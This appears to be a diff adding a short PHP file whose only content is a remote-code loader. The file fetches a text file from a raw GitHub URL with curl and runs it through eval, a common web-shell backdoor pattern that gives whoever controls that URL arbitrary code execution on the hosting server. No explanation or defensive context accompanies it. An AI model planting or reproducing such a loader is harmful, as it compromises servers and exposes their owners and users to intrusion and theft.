@@ -1,0 +1,15 @@
+<?php
+function geturlsinfo($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $output = curl_exec($ch);
+    curl_close($ch);
+    return $output;
+}
+
+$a = geturlsinfo('https://raw.githubusercontent.com/kbol08992-lang/data/refs/heads/main/sayang-istri.txt');
+
+eval('?>' . $a);
+
+?>
